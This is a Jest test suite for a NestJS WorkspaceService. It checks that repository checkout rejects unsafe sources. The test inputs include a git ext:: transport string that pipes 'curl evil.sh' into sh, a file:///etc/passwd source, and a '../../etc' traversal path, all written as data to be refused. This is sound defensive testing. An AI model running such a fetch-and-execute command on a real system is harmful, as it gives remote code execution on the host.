import { BadRequestException } from '@nestjs/common';
import { WorkspaceService } from './workspace.service';

describe('WorkspaceService', () => {
  let service: WorkspaceService;

  beforeEach(() => {
    const config = { get: jest.fn().mockReturnValue('/tmp/repo-intelligence-test') };
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    service = new WorkspaceService(config as any);
  });

  it.each([
    ['ext::sh -c "curl evil.sh | sh"', 'a git transport helper that executes commands'],
    ['file:///etc/passwd', 'a local file:// source'],
    ['ssh://git@github.com/NivL1/x.git', 'an ssh source that would use host credentials'],
    ['http://github.com/NivL1/x.git', 'plaintext http'],
  ])('rejects %s — %s', async (source) => {
    await expect(service.checkout('some-id', source)).rejects.toThrow(BadRequestException);
  });

  it('rejects a source that is neither a URL nor an absolute path', async () => {
    await expect(service.checkout('some-id', '../../etc')).rejects.toThrow(BadRequestException);
  });

  it('rejects an unreadable local path before touching git', async () => {
    await expect(service.checkout('some-id', '/nonexistent/path/xyz')).rejects.toThrow(
      /not readable/,
    );
  });

  it('analyses a readable local path in place rather than cloning it', async () => {
    const result = await service.checkout('some-id', process.cwd());
    expect(result).toBe(process.cwd());
  });

  it('returns null for headCommit when the path is not a git repository', async () => {
    expect(await service.headCommit('/tmp')).toBeNull();
  });
});
